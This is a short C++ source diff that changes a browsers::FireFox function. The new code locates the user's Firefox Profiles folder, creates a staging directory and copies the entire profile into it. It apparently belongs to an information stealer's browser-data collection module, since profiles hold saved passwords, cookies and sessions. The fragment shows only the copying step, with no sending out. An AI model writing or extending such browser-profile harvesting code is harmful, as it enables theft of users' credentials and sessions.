@@ -146,11 +146,15 @@ void browsers::Chromium()
 
 void browsers::FireFox()
 {
-    std::string path = global::roaming + "/Mozilla/Firefox";
-    //std::string defPaths[] = global::defaultPath + "/Firefox";
+    std::string path = global::roaming + "/Mozilla/Firefox/Profiles";
+    std::string defPaths = global::defaultPath + "/Firefox";
+    int result = _mkdir(global::defaultPath.c_str());
 
     if (std::filesystem::exists(path))
     {
+        int result = _mkdir(defPaths.c_str());
+
+        func::copyDirectory(path, defPaths);
 
     }
 }
